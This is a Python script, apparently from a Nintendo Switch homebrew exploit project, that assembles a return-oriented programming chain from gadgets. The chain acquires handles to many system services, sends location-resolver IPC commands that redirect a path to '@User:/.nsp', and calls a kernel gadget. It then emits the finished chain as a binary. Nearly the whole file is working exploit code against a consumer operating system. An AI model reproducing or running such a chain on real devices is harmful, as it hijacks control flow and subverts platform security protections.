import RopChain
import Gadgets
import Sequences
import ImmEncoder
import IpcCommand
import Service
import StringEncoder

r = RopChain.Chain()
r.add(Sequences.Nop()) # Required.

SERVICES = {
    'apm':True, 'apm:p':True, 'apm:sys':True, 'fgm':True, 'fgm:0':True, 'fgm:9':True,
    'caps:a':True, 'caps:c':True,
    'fsp-srv':True, 'fsp-ldr':False, 'fsp-pr':False,
    'lr':True, 'ncm':True,
    'nifm:u':True, 'nifm:a':True, 'nifm:s':True,
    'nvdrv:a':True, 'nvdrv:s':True, 'nvdrv:t':True,
    'pctl':True, 'pctl:a':True, 'pctl:s':True, 'pctl:r':True,
    'pm:bm':True, 'pm:info':True, 'pm:shell':True,
    'ldr:ro':True, 'ro:dmnt':True,
    'usb:ds':True, 'usb:hs':True, 'usb:pd':True, 'usb:pd:c':True, 'usb:pm':True,
    'wlan:inf':True, 'wlan:lcl':True, 'wlan:lg':True, 'wlan:lga':True, 'wlan:sg':True, 'wlan:soc':True
}

def encode_str(s):
    x = int(s[::-1].encode('hex'), 16)
    return [Gadgets.Imm(x)]

service_handle_ptrs = {}

# Get services
for s in SERVICES:
    handle_ptr = r.add_data([Gadgets.Imm(0)])
    service_str = r.add_data(encode_str(s))
    srv = Service.Service(handle_ptr, service_str, SERVICES[s])
    for g in srv.generate():
        r.add(g)
    service_handle_ptrs[s]  = handle_ptr

lr_handle_ptr = service_handle_ptrs['lr']

# Construct cmd0 to lr
cmd = IpcCommand.Cmd(lr_handle_ptr, 0, [3])
for g in cmd.generate(r):
    r.add(g)
#r.add(Sequences.CrashIfResultFailed()) # Fails on emu

# Copy out handle
lr_handle_ptr = service_handle_ptrs['fsp-srv']
r.add(Sequences.Load_X0X1X2X3(lr_handle_ptr, IpcCommand.IPC_PTR+12, Gadgets.Imm(4)))
r.add(Sequences.Memcpy())

# Construct @User:/.nsp
nsp_str = '@User:/.nsp\0'
NSP_PTR = Gadgets.MainGadget(0x8AC000)
r.add(Sequences.Load_X0X1X2X3(NSP_PTR))

for g in StringEncoder.Str(NSP_PTR, nsp_str).generate(r):
    r.add(g)

# Make the nsp cmd
nsp_ptr_ptr = Gadgets.PlaceholderReference(NSP_PTR)
cmd = IpcCommand.Cmd(lr_handle_ptr, 1, [0x010000000000100D], x=[nsp_ptr_ptr, 300])
for g in cmd.generate(r):
    r.add(g)

class PressButtonLoop:
    def get_addr(self):
        return Sequences.Load_X0X1X2X3().get_addr()

    def generate(self, next_x29, next_x30):
        ret = [
            Gadgets.DontCare(),  # x29
            Sequences.Nop().get_addr(), # x30
            Gadgets.ButtonPtrGadget(), # x0
            Gadgets.DontCare(),  # x1
            Gadgets.Imm(0x100),  # x2
            Gadgets.DontCare(),  # x3
            # add sp, #0x20; ret

            Gadgets.DontCare(),  # x29
            Sequences.CallX8().get_addr(), # x30

            Gadgets.RelativeReference(-8*14 - 0x60), # x29
            Gadgets.KernelGadget(0x4A00), # x30
        ]
        return ret

r.add(Sequences.LoadX8(Sequences.Write_W2_X0().get_addr()))
r.add(Sequences.Nop())
r.add(Sequences.Nop())
r.add(Sequences.Nop())
r.add(Sequences.Nop())
r.add(Sequences.Nop())
r.add(Sequences.Nop())
r.add(Sequences.Nop())
r.add(Sequences.Nop())
r.add(PressButtonLoop())

r.add(Sequences.InfLoop())


r.emit('build/rop.bin', 'build/rop_relocs.bin')
